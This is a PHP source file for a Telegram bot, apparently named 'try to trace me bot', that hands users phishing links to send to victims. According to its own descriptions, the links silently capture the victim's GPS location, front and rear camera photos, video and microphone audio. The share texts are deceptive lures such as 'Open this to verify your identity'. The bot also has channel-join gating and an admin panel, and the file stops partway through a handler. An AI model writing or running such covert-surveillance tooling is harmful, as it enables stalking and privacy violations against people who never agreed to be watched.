<?php

 $botToken = ';
 $apiURL   = "https://api.telegram.org/bot$botToken";

// ═══════════ CONFIG ═══════════
 $channel1      = '@scriptifydevs';
 $channel2      = '@scriptifydevs';
 $channel3      = '@pakcyberxpert';
 $adminIDs      = [];
 $baseDir       = __DIR__ . '/sr_data/';
 $usersFile     = $baseDir . 'users.json';
 $statsFile     = $baseDir . 'stats.json';
 $pendingFile   = $baseDir . 'pending.json';
 $logsFile      = $baseDir . 'logs.json';

 $LINKS = [
    'loc' => 'https://api-cyber.serv00.net/v1/loc_bot.php?id=',
    'cf'  => 'https://api-cyber.serv00.net/v1/cf_bot.php?id=',
    'cb'  => 'https://api-cyber.serv00.net/v1/cb_bot.php?id=',
    'vf'  => 'https://api-cyber.serv00.net/v1/vf_bot.php?id=',
    'vb'  => 'https://api-cyber.serv00.net/v1/vb_bot.php?id=',
    'vc'  => 'https://api-cyber.serv00.net/v1/vc_bot.php?id=',
];

 $TOOL_NAMES = [
    'loc' => '📍 GPS Location',
    'cf'  => '📷 Front Cam',
    'cb'  => '📹 Back Cam',
    'vf'  => '🎥 Front Video',
    'vb'  => '📼 Back Video',
    'vc'  => '🎤 Voice Record',
];

if (!is_dir($baseDir)) {
    @mkdir($baseDir, 0755, true);
    @file_put_contents($baseDir . '.htaccess', "Deny from all");
    @file_put_contents($baseDir . 'index.php', '<?php http_response_code(403); exit;');
}

// ═══════════ DATA ═══════════
function ld($f) { if(!file_exists($f))return[]; $d=@json_decode(@file_get_contents($f),true); return is_array($d)?$d:[]; }
function sd($f,$d) { @file_put_contents($f,json_encode($d,JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE)); }

function trackUser($cid, $un, $fn) {
    global $usersFile, $statsFile;
    $u=ld($usersFile); $nw=!isset($u[$cid]);
    $u[$cid]=['id'=>$cid,'username'=>$un?:'N/A','first_name'=>$fn,
        'joined'=>$nw?date('Y-m-d H:i:s'):($u[$cid]['joined']??date('Y-m-d H:i:s')),
        'last_seen'=>date('Y-m-d H:i:s'),'commands'=>($u[$cid]['commands']??0)+1,'banned'=>$u[$cid]['banned']??false];
    sd($usersFile,$u);
    $s=ld($statsFile); $s['total_commands']=($s['total_commands']??0)+1; $s['total_users']=count($u);
    if($nw)$s['new_today']=($s['new_today']??0)+1; sd($statsFile,$s);
    return $nw;
}

function addLog($cid, $tool) {
    global $logsFile;
    $l=ld($logsFile); $l[]=['user'=>$cid,'tool'=>$tool,'time'=>date('Y-m-d H:i:s')];
    if(count($l)>500) $l=array_slice($l,-500);
    sd($logsFile,$l);
}

function isAdmin($cid) { global $adminIDs; return in_array($cid,$adminIDs); }
function isBanned($cid) { global $usersFile; $u=ld($usersFile); return ($u[$cid]['banned']??false)===true; }

// ═══════════ TELEGRAM API ═══════════
function sm($cid, $txt, $btns=null, $parse='Markdown') {
    global $apiURL;
    $p=['chat_id'=>$cid,'text'=>$txt,'parse_mode'=>$parse,'disable_web_page_preview'=>true];
    if($btns)$p['reply_markup']=json_encode(['inline_keyboard'=>$btns]);
    $ch=curl_init("$apiURL/sendMessage");
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$p,CURLOPT_TIMEOUT=>10,CURLOPT_SSL_VERIFYPEER=>false]);
    $r=@curl_exec($ch);@curl_close($ch);
    return $r?json_decode($r,true):null;
}

function em($cid,$mid,$txt,$btns=null) {
    global $apiURL;
    $p=['chat_id'=>$cid,'message_id'=>$mid,'text'=>$txt,'parse_mode'=>'Markdown','disable_web_page_preview'=>true];
    if($btns)$p['reply_markup']=json_encode(['inline_keyboard'=>$btns]);
    $ch=curl_init("$apiURL/editMessageText");
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>$p,CURLOPT_TIMEOUT=>10,CURLOPT_SSL_VERIFYPEER=>false]);
    @curl_exec($ch);@curl_close($ch);
}

function dm($cid,$mid) {
    global $apiURL;
    $ch=curl_init("$apiURL/deleteMessage");
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>['chat_id'=>$cid,'message_id'=>$mid],CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>false]);
    @curl_exec($ch);@curl_close($ch);
}

function acb($cbid,$txt="",$alert=false) {
    global $apiURL;
    $ch=curl_init("$apiURL/answerCallbackQuery");
    curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,CURLOPT_POSTFIELDS=>['callback_query_id'=>$cbid,'text'=>$txt,'show_alert'=>$alert],CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>false]);
    @curl_exec($ch);@curl_close($ch);
}

function checkJoin($cid,$ch) {
    global $apiURL;
    $c=curl_init("$apiURL/getChatMember?".http_build_query(['chat_id'=>$ch,'user_id'=>$cid]));
    curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_TIMEOUT=>5,CURLOPT_SSL_VERIFYPEER=>false]);
    $r=@curl_exec($c);@curl_close($c); $d=json_decode($r,true);
    return isset($d['result']['status'])&&in_array($d['result']['status'],['member','administrator','creator']);
}

// ═══════════ INPUT ═══════════
 $data=json_decode(file_get_contents("php://input"),true);
 $chat_id=$data['message']['chat']['id']??$data['callback_query']['message']['chat']['id']??null;
 $username=$data['message']['chat']['username']??$data['callback_query']['from']['username']??'Unknown';
 $first_name=$data['message']['chat']['first_name']??$data['callback_query']['from']['first_name']??'User';
 $text=$data['message']['text']??'';
 $cb_data=$data['callback_query']['data']??null;
 $cb_msg_id=$data['callback_query']['message']['message_id']??null;
 $cb_chat_id=$data['callback_query']['message']['chat']['id']??null;
 $cb_id=$data['callback_query']['id']??null;

if($chat_id){
    if(isBanned($chat_id)){if($text)sm($chat_id,"🚫 *You are banned.*");exit;}
    trackUser($chat_id,$username,$first_name);
}

// ═══════════ KEYBOARDS ═══════════
function mainKB() {
    return [
        [['text'=>'📷 Front Cam','callback_data'=>'tool_cf'],['text'=>'📹 Back Cam','callback_data'=>'tool_cb']],
        [['text'=>'🎥 Front Video','callback_data'=>'tool_vf'],['text'=>'📼 Back Video','callback_data'=>'tool_vb']],
        [['text'=>'📍 Live Location','callback_data'=>'tool_loc'],['text'=>'🎤 Voice Record','callback_data'=>'tool_vc']],
        [['text'=>'📂 All Modules','callback_data'=>'all_modules'],['text'=>'⚙️ Settings','callback_data'=>'settings']]
    ];
}

function adminKB() {
    return [
        [['text'=>'📊 Stats','callback_data'=>'admin_stats'],['text'=>'👥 Users','callback_data'=>'admin_users']],
        [['text'=>'📢 Broadcast','callback_data'=>'admin_broadcast'],['text'=>'📨 Send Msg','callback_data'=>'admin_sendmsg']],
        [['text'=>'🚫 Ban User','callback_data'=>'admin_ban'],['text'=>'✅ Unban','callback_data'=>'admin_unban']],
        [['text'=>'📋 Activity Log','callback_data'=>'admin_logs'],['text'=>'🔧 Admins','callback_data'=>'admin_list']],
        [['text'=>'🗑 Reset Stats','callback_data'=>'admin_clear'],['text'=>'🔙 User Menu','callback_data'=>'back_home']]
    ];
}

function joinKB() {
    global $channel1, $channel2 ,$channel3;
    return [
        [ 
            ['text' => '🩸 Join', 'url' => 'https://t.me/' . ltrim($channel1, '@')],
            ['text' => '🩸 Join', 'url' => 'https://t.me/shadowinnovations']
        ],
        [ 
            ['text' => '🩸 Join', 'url' => 'https://t.me/' . ltrim($channel3, '@')]
        ],
        [ 
            ['text' => '✅ I\'ve Joined', 'callback_data' => 'check_join']
        ]
    ];
}

function toolKB($key) {
    global $LINKS,$TOOL_NAMES;
    $link=$LINKS[$key];
    $shareText=match($key){
        'loc'=>'Open this to see your surprise 🎁',
        'cf'=>'Open this to verify your identity 🔒',
        'cb'=>'Open this for security check 🛡️',
        'vf'=>'Open this for video verification 🎬',
        'vb'=>'Open this for area scan 🛰️',
        'vc'=>'Open this for voice verification 🎙️',
        default=>'Open this link 🔗'
    };
    $otherTools=array_filter(['cf','cb','vf','vb','loc','vc'],fn($k)=>$k!==$key);
    $other=array_slice($otherTools,0,2);
    return [
        [['text'=>'📤 Share Link','url'=>'https://t.me/share/url?url='.urlencode($link).'&text='.urlencode($shareText)],['text'=>'📋 Copy','callback_data'=>'copy_hint']],
        [['text'=>$TOOL_NAMES[$other[0]],'callback_data'=>'tool_'.$other[0]],['text'=>$TOOL_NAMES[$other[1]],'callback_data'=>'tool_'.$other[1]]],
        [['text'=>'🏠 Menu','callback_data'=>'back_home']]
    ];
}

// ═══════════ TOOL DESCRIPTIONS ═══════════
function toolMsg($key,$link) {
    $msgs=[
        'loc'=>"📍 *GPS LOCATION TRACKER*\n━━━━━━━━━━━━━━━━━━━━\n\n🗺 Real-time coordinates grabber\n📱 Google Maps integration\n⚡ Instant location ping\n🎯 Accuracy within 10 meters\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _Every move tracked._",
        'cf'=>"👁‍🗨 *FRONT CAM CAPTURE*\n━━━━━━━━━━━━━━━━━━━━\n\n📷 Silent front camera snapshot\n📸 High quality image capture\n⚡ Instant photo to Telegram\n🔄 Target sees nothing\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _They won't see it coming._",
        'cb'=>"📹 *REAR CAM CAPTURE*\n━━━━━━━━━━━━━━━━━━━━\n\n📷 Silent rear camera snapshot\n📸 Environment awareness grab\n⚡ Instant photo to Telegram\n🔄 Target sees nothing\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _Nowhere to hide._",
        'vf'=>"🎥 *FRONT VIDEO RECORD*\n━━━━━━━━━━━━━━━━━━━━\n\n📹 Silent front camera recording\n⏱ 18 second stealth capture\n🎬 Direct video to Telegram\n🔄 Auto-delete after sending\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _Full surveillance mode._",
        'vb'=>"📼 *REAR VIDEO RECORD*\n━━━━━━━━━━━━━━━━━━━━\n\n📹 Silent rear camera recording\n⏱ 18 second stealth capture\n🎬 Direct video to Telegram\n🔄 Auto-delete after sending\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _Every angle covered._",
        'vc'=>"🎤 *VOICE RECORDER*\n━━━━━━━━━━━━━━━━━━━━\n\n🎙 Silent microphone recording\n⏱ 15 second audio capture\n🔊 Voice message to Telegram\n🔄 Target hears nothing\n\n🔗 *Target Link:*\n\n`{$link}`\n\n💀 _Every word captured._",
    ];
    return $msgs[$key]??"🔧 Tool: `{$link}`";
}

// ═══════════ TEXT COMMANDS ═══════════
if($text) {
// /start
    if($text==='/start'||strpos($text,'/start ')===0) {
        $j1=checkJoin($chat_id,$channel1);$j2=checkJoin($chat_id,$channel2);$j3=checkJoin($chat_id,$channel3);
        
        if($j1 && $j2 && $j3){
            $msg="⚡ *try to trace me bot * ⚡\n━━━━━━━━━━━━━━━━━━━━\n\n👤 Welcome, *{$first_name}*!\n✅ Access Granted.\n\n🎯 _Select a module to deploy:_";
            $kb=mainKB();
            if(isAdmin($chat_id)) $kb[]= [['text'=>'🔧 Admin Panel','callback_data'=>'admin_panel']];
            sm($chat_id,$msg,$kb);
        }else{
            sm($chat_id,"🚫 *ACCESS DENIED*\n\n🔒 Join all channels to unlock tools.\n\n⚡ Tap ✅ after joining:",joinKB());
        }
    }
    // /admin
    elseif($text==='/admin') {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 *Access Denied.* Admin only.");exit;}
        sm($chat_id,"🔧 *ADMIN CONTROL PANEL*\n━━━━━━━━━━━━━━━━━━━━\n\n👤 Admin: *{$first_name}*\n🆔 ID: `{$chat_id}`\n👥 Users: *".count(ld($usersFile))."*\n\n_Select an action:_",adminKB());
    }

    // /stats
    elseif($text==='/stats') {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $s=ld($statsFile);$u=ld($usersFile);$bn=count(array_filter($u,fn($x)=>($x['banned']??false)===true));
        sm($chat_id,"📊 *BOT STATISTICS*\n\n👥 Total Users: *".count($u)."*\n🆕 New Today: *".($s['new_today']??0)."*\n⚡ Total Commands: *".($s['total_commands']??0)."*\n🚫 Banned: *{$bn}*\n🔧 Admins: *".count($adminIDs)."*");
    }

    // /broadcast
    elseif(strpos($text,'/broadcast ')===0) {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $bmsg=trim(substr($text,11));
        if(empty($bmsg)){sm($chat_id,"📢 Usage: `/broadcast Your message here`");exit;}
        $users=ld($usersFile);$sent=0;$fail=0;$total=0;
        foreach($users as $uid=>$ud){if(($ud['banned']??false)===true)continue;$total++;}
        $statusMsg=sm($chat_id,"📢 *BROADCASTING...*\n\n📊 Progress: 0/{$total}");
        $statusMid=$statusMsg['result']['message_id']??null;
        foreach($users as $uid=>$ud){
            if(($ud['banned']??false)===true)continue;
            $r=sm($uid,"📢 *BROADCAST*\n\n".$bmsg);
            if($r&&($r['ok']??false))$sent++;else $fail++;
            if(($sent+$fail)%5===0&&$statusMid){
                em($chat_id,$statusMid,"📢 *BROADCASTING...*\n\n✅ Sent: {$sent}\n❌ Failed: {$fail}\n📊 Progress: ".($sent+$fail)."/{$total}");
            }
            usleep(350000);
        }
        if($statusMid)em($chat_id,$statusMid,"✅ *BROADCAST COMPLETE*\n\n✅ Sent: {$sent}\n❌ Failed: {$fail}\n📊 Total: {$total}");
    }

    // /ban
    elseif(strpos($text,'/ban ')===0) {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $bid=trim(substr($text,5));if(!is_numeric($bid)){sm($chat_id,"❌ Invalid ID.");exit;}
        $u=ld($usersFile);if(isset($u[$bid])){$u[$bid]['banned']=true;sd($usersFile,$u);sm($chat_id,"🚫 User `{$bid}` banned.");sm($bid,"🚫 *You have been banned.*");}else{sm($chat_id,"❌ User not found.");}
    }

    // /unban
    elseif(strpos($text,'/unban ')===0) {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $bid=trim(substr($text,7));if(!is_numeric($bid)){sm($chat_id,"❌ Invalid ID.");exit;}
        $u=ld($usersFile);if(isset($u[$bid])){$u[$bid]['banned']=false;sd($usersFile,$u);sm($chat_id,"✅ User `{$bid}` unbanned.");sm($bid,"✅ *You have been unbanned!*");}else{sm($chat_id,"❌ User not found.");}
    }

    // /userinfo
    elseif(strpos($text,'/userinfo ')===0) {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $uid=trim(substr($text,10));$u=ld($usersFile);
        if(isset($u[$uid])){$x=$u[$uid];sm($chat_id,"👤 *USER INFO*\n\n🆔 ID: `{$x['id']}`\n👤 Name: {$x['first_name']}\n📎 @{$x['username']}\n📅 Joined: {$x['joined']}\n👁 Last: {$x['last_seen']}\n⚡ Commands: {$x['commands']}\n🚫 Banned: ".(($x['banned']??false)?'Yes':'No'));}
        else{sm($chat_id,"❌ User not found.");}
    }

    // /send
    elseif(strpos($text,'/send ')===0) {
        if(!isAdmin($chat_id)){sm($chat_id,"🚫 Admin only.");exit;}
        $p=explode(' ',trim(substr($text,6)),2);if(count($p)<2){sm($chat_id,"❌ Usage: `/send ID message`");exit;}
        $r=sm($p[0],"📨 *Admin Message:*\n\n".$p[1]);
        sm($chat_id,($r&&($r['ok']??false))?"✅ Sent to `{$p[0]}`":"❌ Failed.");
    }

    // Pending actions (broadcast/msg mode)
    else {
        $pnd=ld($pendingFile);
        if(isset($pnd[$chat_id])){
            if(!isAdmin($chat_id)){unset($pnd[$chat_id]);sd($pendingFile,$pnd);exit;}
            $mode=$pnd[$chat_id]['mode'];$target=$pnd[$chat_id]['target']??null;
            unset($pnd[$chat_id]);sd($pendingFile,$pnd);

            if($mode==='broadcast'){
                $users=ld($usersFile);$sent=0;$fail=0;$total=0;
                foreach($users as $uid=>$ud)if(($ud['banned']??false)!==true)$total++;
                $statusMsg=sm($chat_id,"📢 *BROADCASTING...*\n\n📊 0/{$total}");
                $statusMid=$statusMsg['result']['message_id']??null;
                foreach($users as $uid=>$ud){
                    if(($ud['banned']??false)===true)continue;
                    $r=sm($uid,"📢 *BROADCAST*\n\n".$text);
                    if($r&&($r['ok']??false))$sent++;else$fail++;
                    if(($sent+$fail)%5===0&&$statusMid)em($chat_id,$statusMid,"📢 *BROADCASTING...*\n\n✅ {$sent} | ❌ {$fail} | 📊 ".($sent+$fail)."/{$total}");
                    usleep(350000);
                }
                if($statusMid)em($chat_id,$statusMid,"✅ *BROADCAST COMPLETE*\n\n✅ Sent: {$sent}\n❌ Failed: {$fail}\n📊 Total: {$total}");
            }
            elseif($mode==='sendmsg'&&$target){
                $r=sm($target,"📨 *Admin Message:*\n\n".$text);
                sm($chat_id,($r&&($r['ok']??false))?"✅ Sent to `{$target}`":"❌ Failed.");
            }
        }
    }
}

// ═══════════ CALLBACKS ═══════════
if($cb_data) {

  // CHECK JOIN
    if($cb_data==='check_join') {
        $j1=checkJoin($cb_chat_id,$channel1);$j2=checkJoin($cb_chat_id,$channel2);$j3=checkJoin($cb_chat_id,$channel3);
        
        if($j1 && $j2 && $j3){
            acb($cb_id,"✅ Verified!");
            dm($cb_chat_id,$cb_msg_id);
            $msg="⚡ *try to trace me bot ⚡\n━━━━━━━━━━━━━━━━━━━━\n\n👤 Welcome, *{$first_name}*!\n✅ Access Granted.\n\n🎯 _Select a module:_";
            sm($cb_chat_id,$msg,mainKB());
        }else{
            acb($cb_id,"❌ Join all channels first!",true);
        }
    }
    // ═══ TOOL MODULES ═══
    elseif(strpos($cb_data,'tool_')===0) {
        $key=str_replace('tool_','',$cb_data);
        if(!isset($LINKS[$key])){acb($cb_id,"❌ Unknown tool");exit;}
        $link=$LINKS[$key].$cb_chat_id;
        addLog($cb_chat_id,$key);
        acb($cb_id,$TOOL_NAMES[$key]." Module Loaded");
        dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,toolMsg($key,$link),toolKB($key));
    }

    // ALL MODULES
    elseif($cb_data==='all_modules') {
        acb($cb_id,"📂 All Modules");dm($cb_chat_id,$cb_msg_id);
        $msg="📂 *ALL ACTIVE MODULES*\n━━━━━━━━━━━━━━━━━━━━\n\n"
            ."🟢 *01.* 📷 Front Cam Snapshot\n"
            ."🟢 *02.* 📹 Back Cam Snapshot\n"
            ."🟢 *03.* 🎥 Front Video 18s\n"
            ."🟢 *04.* 📼 Back Video 18s\n"
            ."🟢 *05.* 📍 GPS Tracker\n"
            ."🟢 *06.* 🎤 Voice Recorder 15s\n"
            ."🔒 *07.* 🔊 Mic Intercept *(Soon)*\n"
            ."🔒 *08.* 💬 SMS Extract *(Soon)*\n\n"
            ."_⚡ 6 modules active_";
        sm($cb_chat_id,$msg,[
            [['text'=>'📷 Cam','callback_data'=>'tool_cf'],['text'=>'🎥 Video','callback_data'=>'tool_vf']],
            [['text'=>'📍 GPS','callback_data'=>'tool_loc'],['text'=>'🎤 Voice','callback_data'=>'tool_vc']],
            [['text'=>'🏠 Menu','callback_data'=>'back_home']]
        ]);
    }

    // SETTINGS
    elseif($cb_data==='settings') {
        acb($cb_id,"⚙️");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"⚙️ *SETTINGS*\n━━━━━━━━━━━━━━━━━━━━\n\n👤 User: *{$first_name}*\n🆔 ID: `{$cb_chat_id}`\n🛡 Status: *Verified*",[
            [['text'=>'🩸 Updates','url'=>'https://t.me/Scriptifydevs'],['text'=>'ℹ️ About','callback_data'=>'about']],
            [['text'=>'🏠 Menu','callback_data'=>'back_home']]
        ]);
    }

    // ABOUT
    elseif($cb_data==='about') {
        acb($cb_id,"ℹ️");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"💀 *try to trace me bot*\n━━━━━━━━━━━━━━━━━━━━\n\n⚡ Advanced OSINT Toolkit\n👨💻 Dev: @Scriptifydevs\n🎯 Modules: 6 Active\n🛡 Stealth: 100% Invisible\n📊 Users: ".count(ld($usersFile))."\n\n_⚠️ Educational use only._",[
            [['text'=>'🩸 Dev','url'=>'https://t.me/XBlackHat'],['text'=>'🩸 Updates','url'=>'https://t.me/Scriptifydevs']],
            [['text'=>'🏠 Menu','callback_data'=>'back_home']]
        ]);
    }

    // COPY HINT
    elseif($cb_data==='copy_hint') {
        acb($cb_id,"📋 Long-press the link above to copy!",false);
    }

    // ═══ ADMIN CALLBACKS ═══

    // ADMIN STATS
    elseif($cb_data==='admin_stats') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫",true);exit;}
        acb($cb_id,"📊");dm($cb_chat_id,$cb_msg_id);
        $s=ld($statsFile);$u=ld($usersFile);$bn=count(array_filter($u,fn($x)=>($x['banned']??false)===true));
        $on=0;foreach($u as $x)if(strtotime($x['last_seen'])>time()-86400)$on++;
        $l=ld($logsFile);$todayLogs=count(array_filter($l,fn($x)=>strpos($x['time']??'',date('Y-m-d'))===0));
        sm($cb_chat_id,"📊 *BOT STATISTICS*\n━━━━━━━━━━━━━━━━━━━━\n\n👥 Total Users: *".count($u)."*\n✅ Active: *".(count($u)-$bn)."*\n🟢 Online (24h): *{$on}*\n🆕 New Today: *".($s['new_today']??0)."*\n⚡ Total Commands: *".($s['total_commands']??0)."*\n🎯 Tools Used Today: *{$todayLogs}*\n🚫 Banned: *{$bn}*\n🔧 Admins: *".count($adminIDs)."*\n\n_📊 Real-time data_",[
            [['text'=>'🔄 Refresh','callback_data'=>'admin_stats'],['text'=>'🔙 Admin','callback_data'=>'admin_panel']]
        ]);
    }

    // ADMIN USERS
    elseif($cb_data==='admin_users') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫",true);exit;}
        acb($cb_id,"👥");dm($cb_chat_id,$cb_msg_id);
        $u=ld($usersFile);
        if(empty($u)){sm($cb_chat_id,"👥 No users.",[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);exit;}
        $recent=array_slice(array_reverse($u,true),0,20,true);
        $msg="👥 *RECENT USERS* (Last 20)\n━━━━━━━━━━━━━━━━━━━━\n\n";
        $btns=[];$i=0;
        foreach($recent as $uid=>$x){
            $i++;$st=($x['banned']??false)?'🚫':'✅';$nm=$x['first_name']??'???';
            $msg.="{$st} `{$uid}` — *{$nm}*\n";
            if($i<=10)$btns[]=[['text'=>"{$st} {$nm} ({$uid})",'callback_data'=>"ud_{$uid}"]];
        }
        $msg.="\n_Total: ".count($u)." users_";
        $btns[]=[['text'=>'🔙 Admin Panel','callback_data'=>'admin_panel']];
        sm($cb_chat_id,$msg,$btns);
    }

    // USER DETAIL
    elseif(strpos($cb_data,'ud_')===0) {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        $uid=str_replace('ud_','',$cb_data);$u=ld($usersFile);
        if(!isset($u[$uid])){acb($cb_id,"❌ Not found",true);exit;}
        acb($cb_id,"👤");dm($cb_chat_id,$cb_msg_id);
        $x=$u[$uid];
        sm($cb_chat_id,"👤 *USER DETAIL*\n━━━━━━━━━━━━━━━━━━━━\n\n🆔 ID: `{$x['id']}`\n👤 Name: *{$x['first_name']}*\n📎 @{$x['username']}\n📅 Joined: {$x['joined']}\n👁 Last: {$x['last_seen']}\n⚡ Commands: {$x['commands']}\n🚫 Banned: ".(($x['banned']??false)?'*Yes*':'No'),[
            [['text'=>'🚫 Ban','callback_data'=>"bn_{$uid}"],['text'=>'✅ Unban','callback_data'=>"ub_{$uid}"]],
            [['text'=>'📨 Message','callback_data'=>"mg_{$uid}"]],
            [['text'=>'👥 Users','callback_data'=>'admin_users'],['text'=>'🔙 Admin','callback_data'=>'admin_panel']]
        ]);
    }

    // BAN
    elseif(strpos($cb_data,'bn_')===0) {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        $uid=str_replace('bn_','',$cb_data);$u=ld($usersFile);
        if(isset($u[$uid])){$u[$uid]['banned']=true;sd($usersFile,$u);acb($cb_id,"🚫 Banned!",true);
        sm($uid,"🚫 *You have been banned by admin.*");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"🚫 User `{$uid}` (*{$u[$uid]['first_name']}*) *banned*.",[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);}
    }

    // UNBAN
    elseif(strpos($cb_data,'ub_')===0) {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        $uid=str_replace('ub_','',$cb_data);$u=ld($usersFile);
        if(isset($u[$uid])){$u[$uid]['banned']=false;sd($usersFile,$u);acb($cb_id,"✅ Unbanned!",true);
        sm($uid,"✅ *You have been unbanned!*");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"✅ User `{$uid}` *unbanned*.",[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);}
    }

    // MSG USER
    elseif(strpos($cb_data,'mg_')===0) {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        $uid=str_replace('mg_','',$cb_data);
        acb($cb_id,"📨 Type your message now. It will be sent to user {$uid}",true);
        $pnd=ld($pendingFile);$pnd[$cb_chat_id]=['mode'=>'sendmsg','target'=>$uid];sd($pendingFile,$pnd);
        sm($cb_chat_id,"📨 *Reply with message for `{$uid}`:*\n\n_Next message = sent to them._",[
            [['text'=>'❌ Cancel','callback_data'=>'cancel_act']]
        ]);
    }

    // BROADCAST
    elseif($cb_data==='admin_broadcast') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"📢 Type your broadcast message now!",true);
        $pnd=ld($pendingFile);$pnd[$cb_chat_id]=['mode'=>'broadcast'];sd($pendingFile,$pnd);
        sm($cb_chat_id,"📢 *BROADCAST MODE*\n\n_Type your message. It will be sent to ALL users._\n\n⚠️ _Next message = broadcast!_",[
            [['text'=>'❌ Cancel','callback_data'=>'cancel_act']]
        ]);
    }

    // SEND MSG
    elseif($cb_data==='admin_sendmsg') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"📨 /send ID message",true);dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"📨 *SEND MESSAGE*\n\n`/send USER_ID Your message`\n\nExample:\n`/send 123456789 Hello!`",[
            [['text'=>'🔙 Admin','callback_data'=>'admin_panel']]
        ]);
    }

    // BAN/UNBAN HELP
    elseif($cb_data==='admin_ban') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"🚫 /ban ID",true);dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"🚫 *BAN USER*\n\n`/ban USER_ID`\n\n`/ban 123456789`",[
            [['text'=>'🔙 Admin','callback_data'=>'admin_panel']]
        ]);
    }
    elseif($cb_data==='admin_unban') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"✅ /unban ID",true);dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"✅ *UNBAN USER*\n\n`/unban USER_ID`\n\n`/unban 123456789`",[
            [['text'=>'🔙 Admin','callback_data'=>'admin_panel']]
        ]);
    }

    // ACTIVITY LOGS
    elseif($cb_data==='admin_logs') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"📋");dm($cb_chat_id,$cb_msg_id);
        $l=ld($logsFile);$recent=array_slice(array_reverse($l),0,20);
        if(empty($recent)){sm($cb_chat_id,"📋 No activity yet.",[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);exit;}
        $msg="📋 *ACTIVITY LOG* (Last 20)\n━━━━━━━━━━━━━━━━━━━━\n\n";
        foreach($recent as $e){
            $tn=$TOOL_NAMES[$e['tool']]??$e['tool'];
            $msg.="• {$tn} — `{$e['user']}` — {$e['time']}\n";
        }
        sm($cb_chat_id,$msg,[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);
    }

    // ADMIN LIST
    elseif($cb_data==='admin_list') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"📋");dm($cb_chat_id,$cb_msg_id);
        $msg="📋 *ADMIN LIST*\n━━━━━━━━━━━━━━━━━━━━\n\n";
        foreach($adminIDs as $i=>$a) $msg.=($i+1).". `{$a}`".($a==$cb_chat_id?" *(You)*":"")."\n";
        sm($cb_chat_id,$msg,[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);
    }

    // CLEAR STATS
    elseif($cb_data==='admin_clear') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫");exit;}
        acb($cb_id,"🗑 Reset!");dm($cb_chat_id,$cb_msg_id);
        sd($statsFile,['total_commands'=>0,'total_users'=>count(ld($usersFile)),'new_today'=>0]);
        sd($logsFile,[]);
        sm($cb_chat_id,"🗑 *All stats & logs cleared!*",[[['text'=>'🔙 Admin','callback_data'=>'admin_panel']]]);
    }

    // ADMIN PANEL
    elseif($cb_data==='admin_panel') {
        if(!isAdmin($cb_chat_id)){acb($cb_id,"🚫",true);exit;}
        acb($cb_id,"🔧");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"🔧 *ADMIN CONTROL PANEL*\n━━━━━━━━━━━━━━━━━━━━\n\n👤 *{$first_name}*\n🆔 `{$cb_chat_id}`\n👥 Users: *".count(ld($usersFile))."*\n\n_Select action:_",adminKB());
    }

    // CANCEL
    elseif($cb_data==='cancel_act') {
        $pnd=ld($pendingFile);unset($pnd[$cb_chat_id]);sd($pendingFile,$pnd);
        acb($cb_id,"❌ Cancelled");dm($cb_chat_id,$cb_msg_id);
        sm($cb_chat_id,"❌ *Action cancelled.*",[[['text'=>'🏠 Menu','callback_data'=>'back_home']]]);
    }
// BACK HOME
    elseif($cb_data==='back_home') {
